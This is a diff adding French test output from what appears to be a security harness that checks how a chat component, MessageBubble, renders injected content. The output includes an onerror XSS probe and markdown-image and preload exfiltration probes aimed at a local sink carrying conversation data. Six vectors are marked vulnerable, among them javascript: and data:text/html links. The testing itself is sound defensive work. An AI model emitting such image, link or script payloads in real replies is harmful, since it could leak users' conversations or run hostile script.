@@ -1,0 +1,34 @@
+An empty string ("") was passed to the src attribute. This may cause the browser to download the whole page again over the network. To fix this, either do not render the element at all or pass null to src instead of an empty string.
+=== HTML produit par MessageBubble ===
+
+<link rel="preload" as="image" href="http://127.0.0.1:9999/sonde-image.png?d=conversation-de-bruno"/><article class="bubble bubble--assistant"><div class="bubble__markdown">
+<p>Voici la réponse demandée.</p>
+
+<p>HTML : &lt;img src=x onerror=&quot;console.log(&#x27;SONDE-XSS&#x27;)&quot;&gt;</p>
+
+<p>Image : <img src="http://127.0.0.1:9999/sonde-image.png?d=conversation-de-bruno" alt="pixel"/></p>
+
+<p>SVG : <img alt="svg"/></p>
+
+<p>Lien : <a href="">clique ici</a></p>
+
+<p>Lien : <a href="">ouvrir</a></p>
+
+<p>Lien : <a href="http://127.0.0.1:9999/sonde-lien?d=conversation-de-bruno">la documentation</a></p></div></article>
+
+=== Verdict par vecteur ===
+bloque      html-onerror     HTML brut avec gestionnaire d'événement
+VULNERABLE  image-locale     Image Markdown vers une URL locale (exfiltration)
+bloque      image-data-svg   Image data: de type SVG (seuls png/jpeg/gif/webp sont admis)
+VULNERABLE  lien-javascript  Lien javascript:
+VULNERABLE  lien-data-html   Lien data:text/html
+VULNERABLE  lien-inconnu     Lien vers une origine inconnue (cliquable sans avertissement)
+VULNERABLE  preload-image    <link rel=preload> vers une image distante
+
+=== Témoins positifs (doivent rester fonctionnels) ===
+An empty string ("") was passed to the src attribute. This may cause the browser to download the whole page again over the network. To fix this, either do not render the element at all or pass null to src instead of an empty string.
+fonctionne  citation
+CASSE       image-data-gif
+fonctionne  lien-interne
+
+6 problème(s).
